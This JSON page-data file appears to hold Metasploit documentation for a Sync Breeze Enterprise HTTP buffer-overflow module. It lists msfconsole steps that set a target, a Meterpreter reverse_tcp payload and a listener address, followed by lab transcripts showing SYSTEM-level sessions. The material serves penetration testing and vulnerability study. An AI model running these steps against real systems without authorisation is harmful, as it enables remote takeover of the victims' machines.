{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/syncbreeze_bof","result":{"data":{"moduleMetadataJson":{"id":"f95661f9-26aa-5429-9919-97c9f2ebcaa9","name":"Sync Breeze Enterprise GET Buffer Overflow","fullname":"exploit/windows/http/syncbreeze_bof","description":"This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of Sync Breeze Enterprise v9.4.28, v10.0.28,\n        and v10.1.16, caused by improper bounds checking of the request in\n        HTTP GET and POST requests sent to the built-in web server. This\n        module has been tested successfully on Windows 7 SP1 x86.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/syncbreeze_bof","documentationSlug":"/modules/documentation/exploit/windows/http/syncbreeze_bof"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"http://www.syncbreeze.com\">Sync Breeze Enterprise</a> versions up to v9.4.28, v10.0.28, and v10.1.16\nare affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker\nto execute arbitrary code in the context of NT AUTHORITY\\SYSTEM on the target. The vulnerabilities\nare caused by improper bounds checking of the request path in HTTP GET requests and username value\nvia HTTP POST requests sent to the built-in web server, respectively.</p>\n<p>This module has been tested successfully on Windows 7 SP1. The vulnerable applications are available\nfor download at <a href=\"http://www.syncbreeze.com/setups/syncbreezeent_setup_v9.4.28.exe\">Sync Breeze Enterprise v9.4.28</a>\nand <a href=\"http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe\">Sync Breeze Enterprise v10.0.28</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install a vulnerable Sync Breeze Enterprise</li>\n<li>Start <code class=\"language-text\">Sync Breeze Enterprise</code> service</li>\n<li>Start <code class=\"language-text\">Sync Breeze Enterprise</code> client application</li>\n<li>Navigate to <code class=\"language-text\">Tools</code> > <code class=\"language-text\">Sync Breeze Options</code> > <code class=\"language-text\">Server</code></li>\n<li>Check <code class=\"language-text\">Enable Web Server On Port 80</code> to start the web interface</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/windows/http/syncbreeze_bof</code></li>\n<li>Select appropriate target via <code class=\"language-text\">set target 0</code> or <code class=\"language-text\">set target 1</code></li>\n<li>Do <code class=\"language-text\">set RHOST ip</code></li>\n<li>Do <code class=\"language-text\">check</code></li>\n<li>Verify the target is vulnerable</li>\n<li>Do <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do <code class=\"language-text\">set LHOST ip</code></li>\n<li>Do <code class=\"language-text\">exploit</code></li>\n<li>Verify the Meterpreter session is opened</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"sync-breeze-enterprise-v9428-on-windows-7-sp1\" style=\"position:relative;\"><a href=\"#sync-breeze-enterprise-v9428-on-windows-7-sp1\" aria-label=\"sync breeze enterprise v9428 on windows 7 sp1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Sync Breeze Enterprise v9.4.28 on Windows 7 SP1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(syncbreeze_bof) &gt; show options \n\nModule options (exploit/windows/http/syncbreeze_bof):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST    192.168.2.10     yes       The target address\n   RPORT    80               yes       The target port\n   SSL      false            no        Negotiate SSL/TLS for outgoing connections\n   VHOST                     no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.2.187    yes       The listen address\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Sync Breeze Enterprise v9.4.28\n\n\nmsf exploit(syncbreeze_bof) &gt; exploit \n\n[*] Started reverse TCP handler on 192.168.2.187:4444 \n[*] Sending request...\n[*] Sending stage (957427 bytes) to 172.16.0.18\n[*] Meterpreter session 1 opened (172.16.0.20:4444 -&gt; 172.16.0.18:49162) at 2017-05-16 11:00:25 +0100\n\nmeterpreter &gt; getuid \nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo \nComputer        : PC-01\nOS              : Windows 7 (Build 7600).\nArchitecture    : x86\nSystem Language : pt_PT\nDomain          : LAB\nLogged On Users : 3\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"sync-breeze-enterprise-v10028-on-windows-7-sp1\" style=\"position:relative;\"><a href=\"#sync-breeze-enterprise-v10028-on-windows-7-sp1\" aria-label=\"sync breeze enterprise v10028 on windows 7 sp1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Sync Breeze Enterprise v10.0.28 on Windows 7 SP1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/http/syncbreeze_bof \nmsf exploit(syncbreeze_bof) &gt; set rhost 192.168.10.61\nrhost =&gt; 192.168.10.61\nmsf exploit(syncbreeze_bof) &gt; set target 1\ntarget =&gt; 1\nmsf exploit(syncbreeze_bof) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.10.60:4444 \n[*] Sending request...\n[*] Sending stage (171583 bytes) to 192.168.10.61\n[*] Meterpreter session 1 opened (192.168.10.60:4444 -&gt; 192.168.10.61:4129) at 2017-10-09 13:22:15 -0400\n[+] negotiating tlv encryption\n[+] negotiated tlv encryption\n[+] negotiated tlv encryption\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : MUSHROOMKINGDOM\nOS              : Windows 7 (Build 7600).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f95661f9-26aa-5429-9919-97c9f2ebcaa9"}}}